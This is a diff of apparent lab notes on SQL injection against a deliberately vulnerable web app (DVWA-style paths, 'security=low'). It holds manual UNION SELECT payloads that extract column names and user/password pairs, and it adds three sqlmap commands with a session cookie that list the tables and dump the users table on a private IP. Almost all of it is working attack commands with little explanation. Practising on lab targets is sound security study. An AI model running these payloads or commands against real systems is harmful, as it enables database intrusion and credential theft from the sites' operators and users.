@@ -31,3 +31,9 @@ SQL Injection :
 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #
 
 'UNION SELECT user, password FROM users #
+
+
+SQL Injection using SQLMAP
+sqlmap -u "http://10.192.183.128/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=pa23ugckdvnqdh688ebcopuug3; security=low" --tables 
+sqlmap -u "http://10.192.183.128/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=pa23ugckdvnqdh688ebcopuug3; security=low" -T users --columns --batch
+sqlmap -u "http://10.192.183.128/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=pa23ugckdvnqdh688ebcopuug3; security=low" -T users --batch --dump
